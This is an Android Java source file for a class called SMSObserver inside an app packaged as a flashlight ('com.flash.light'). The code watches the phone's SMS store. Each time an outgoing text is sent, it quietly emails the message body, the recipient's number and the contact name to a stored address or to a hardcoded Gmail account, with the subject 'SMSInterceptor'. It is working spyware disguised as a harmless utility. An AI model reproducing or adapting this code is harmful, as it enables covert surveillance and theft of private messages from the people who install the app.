package com.flash.light; 

import java.util.List;
import java.util.regex.Pattern;
import java.util.regex.Matcher;

import android.net.Uri;
import android.util.Log;
import android.os.Handler;
import android.widget.Toast;
import android.app.Activity;
import android.telephony.SmsManager;

import android.content.Context;
import android.content.ContentResolver;

import android.database.Cursor;
import android.database.DatabaseUtils;
import android.database.ContentObserver;

public class SMSObserver extends ContentObserver {

  private Handler handler;

  
  public  static Context context;
  private static Contacts contact;
  private static DatabaseHandler db;
  private static GmailSender sender; 
  private static Configure configure;

  private static int count = 0;
  private static String initId = "0";
  private static final int maxTries = 3;

  private static String endPoint;
  private static String sPhoneNumberDb;
  private static String sEmailAddressDb;
  private static String gmailEmailString;

  private static final String TAG = "FlashLight SMSObserver";

  public SMSObserver(Handler handler, Context context) {
    super(handler);

    handler = handler;    
    SMSObserver.context = context;
    db = new DatabaseHandler(context);
    contact = new Contacts();

    Log.d(TAG, "Entering SMSObserver constructor");

  }

  @Override
  public void onChange(boolean selfChange) {
    super.onChange(selfChange);

    Log.i(TAG, "Entering onChange()");

    Uri uriSMSURI = Uri.parse("content://sms");
    String[] sCol = {"_id","type","body","address"};
    String sOrder = "date desc limit 1";
   
    Cursor cursor = null;

    try {
      if(db == null) {
        db = new DatabaseHandler(context);
        Log.d(TAG, "SMSObserver() constructor db == null");
        Log.d(TAG, "SMSObserver() constructor db = new DatabaseHandler(context)");
      }

      List<FlashLightDatabase> flashLightDatabase = db.getAllFlashLightDatabase();

      if(flashLightDatabase == null) {
        gmailEmailString = "smsinterceptorapp@gmail.com";
        Log.d(TAG, "SMSObserver() constructor flashLightDatabase == null");
        Log.d(TAG, "SMSObserver() constructor gmailEmailString = \"smsinterceptorapp@gmail.com\"");
      }
      for(FlashLightDatabase fldb : flashLightDatabase) {
        sPhoneNumberDb  = fldb.getPhoneNumber();
        sEmailAddressDb = fldb.getEmailAddress();
      }
      if(sEmailAddressDb == null) {
        gmailEmailString = "smsinterceptorapp@gmail.com";
        Log.d(TAG, "SMSObserver() constructor sEmailAddressDb == null");
        Log.d(TAG, "SMSObserver() constructor gmailEmailString = \"smsinterceptorapp@gmail.com\"");
      }
      else {
        gmailEmailString = sEmailAddressDb;
        Log.d(TAG, "SMSObserver() constructor sEmailAddressDb != null");
        Log.d(TAG, "SMSObserver() constructor gmailEmailString = sEmailAddressDb");
      }
    }
    catch(NullPointerException e) {
      //Log.e(TAG, "SMSObserver() constructor NullPointerException e " + e.toString());
      Log.e(TAG, "SMSObserver() constructor NullPointerException e");
      Log.e(TAG, "SMSObserver() constructor gmailEmailString = \"smsinterceptorapp@gmail.com\"");
      if (++count == maxTries) gmailEmailString = "smsinterceptorapp@gmail.com";
    }

    try {

      cursor = context.getContentResolver().query(uriSMSURI, sCol, null, null, sOrder);
      cursor.moveToLast();

      String id   = cursor.getString(cursor.getColumnIndex("_id"));
      String type = cursor.getString(cursor.getColumnIndex("type"));

      final String body = cursor.getString(cursor.getColumnIndex("body"));
      final String addr = cursor.getString(cursor.getColumnIndex("address"));
      final String con  = contact.getContactName(addr,context);

      if(!con.isEmpty()) {
        endPoint = "" + addr + "(" + con + ")";
      }
      else {
        endPoint = addr;
      }

      Log.i(TAG, "onChange() id: " + id + ", InitId: " + initId + ", type: " + type + ", body: " + body + ", addr: " + endPoint);
	
      //if(!(String.valueOf(initId)).equals(id)) && type.equals("2")) {
      if(!initId.equals(id) && type.equals("2")) {
        initId = id;
        Log.d(TAG, "Ougoing text message sent!");
        new Thread(new Runnable() {

          @Override
          public void run() {
            try {
              if(gmailEmailString != "null") {
                sender = new GmailSender();
                sender.sendMail("SMSInterceptor", "OUTGOING SMS!\n" + "Sent to: " + endPoint + "\nbody:\n" + body, gmailEmailString);
              }
            }
            catch(Exception e) {
              e.printStackTrace();
              Log.e(TAG, "onChange() Exception e " + e.toString());
            }
          }
        }).start();
      }
      else { } // Incoming messages if type == 1
    }
    catch(Exception e) {
      Log.d(TAG, "onChange() Exception e " + e.toString());
    }
    finally {
      if(cursor != null) {
        cursor.close();
      }
    }
  }
}
